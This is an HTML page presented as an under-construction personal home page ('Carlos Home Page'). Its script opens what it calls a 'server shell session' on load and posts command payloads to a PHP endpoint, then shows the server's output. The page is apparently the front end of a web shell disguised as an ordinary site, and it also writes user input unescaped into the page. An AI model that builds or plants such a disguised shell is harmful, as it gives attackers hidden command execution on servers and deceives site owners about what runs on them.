<!DOCTYPE html>
<html>

<head>
<link rel="stylesheet" href="style.css">
<title>Carlos Home Page</title>
<script language=javascript type="text/javascript">
var ajax_request;
var count = 0;
function new_request() {
	document.getElementById('test_dispcmd').innerHTML = document.getElementById('user_command').value;
	ajax_request = null;
	if (window.XMLHttpRequest) {
		ajax_request = new XMLHttpRequest();
	} else if (window.ActiveXObject) {
		ajax_request = new ActiveXObject("Microsoft.XMLHTTP");
	}
	if (ajax_request != null) {
		ajax_request.onreadystatechange = display_result;
		var url = "/driveloop.php";
		var payload = "cmd=PAYLOAD";
		ajax_request.open("POST", url, true);
		ajax_request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
		ajax_request.send(payload);
		document.getElementById('log').insertAdjacentHTML('beforeend', "Sent AJAX request to run command " + " PAYLOAD<br>");
		count = count + 1;
		document.getElementById('counter').innerHTML = count;
	} else {
		alert("Rats! Looks like your browser doesn't support XMLHTTP.");
	}
}

function display_result() {
	document.getElementById('put_state').innerHTML = ajax_request.readyState;
	if(ajax_request.readyState == 4) { 	// 4 => page loaded
	  if(ajax_request.status == 200)  {	// 200 => OK
		document.getElementById('log').insertAdjacentHTML('beforeend', "Received response from driveloop.php<br>");
		document.getElementById('mutable').innerHTML = ajax_request.responseText;
	  } else {
		document.getElementById('log').insertAdjacentHTML('beforeend', "Unable to load response to your AJAX request<br>");
		alert("Unable to load response to your AJAX request.");
	  }
	}	
}

var session_request;
function init_session() {
	session_request = null;
        if (window.XMLHttpRequest) {
                session_request = new XMLHttpRequest();
		document.getElementById('log').insertAdjacentHTML('beforeend', "Your browser uses XMLHttpRequest<br>");
        } else if (window.ActiveXObject) {
                session_request = new ActiveXObject("Microsoft.XMLHTTP");
		document.getElementById('log').insertAdjacentHTML('beforeend', "Your browser uses ActiveXObject<br>");
        }
        if (session_request != null) {
                session_request.onreadystatechange = init_session_callback;
                var url = "/init_session.php";
                session_request.open("POST", url, true);
                session_request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                session_request.send(null);
		document.getElementById('log').insertAdjacentHTML('beforeend', "Sent AJAX request for server shell session<br>");
        } else {
                alert("Rats! Looks like your browser doesn't support XMLHTTP.");
        }
}

function init_session_callback() {
	if (session_request.readyState == 4) {
	   if(session_request.status == 200) {
		document.getElementById('log').insertAdjacentHTML('beforeend', "Response: initialized shell session...<br>");
	   } else {
		document.getElementById('log').insertAdjacentHTML('beforeend', "Unable to load response to your AJAX request<br>");
		alert("Unable to load response to your AJAX request (init session request).");
	   }
	}
}
</script>
</head>

<body onload="init_session()" style="background-color:rgb(200,200,200);">
<h1 id="test_dispcmd" style="text-align:center;">WELCOME!</h1>
<hr>
<pre id="put_state" style="color:blue;text-align:center;">
This page is under construction. 
Please check back in soon!
</pre>
<p id="mutable" style="color:green;text-align:center;">
In the meantime...
</p>
<input id="user_command" type="text" name="command">
<button onclick="new_request()">Request</button>
<p id="counter">0</p>
<hr>
<h3>LOG</h3>
<hr>
<div id="log">
</div>
</body>

</html>
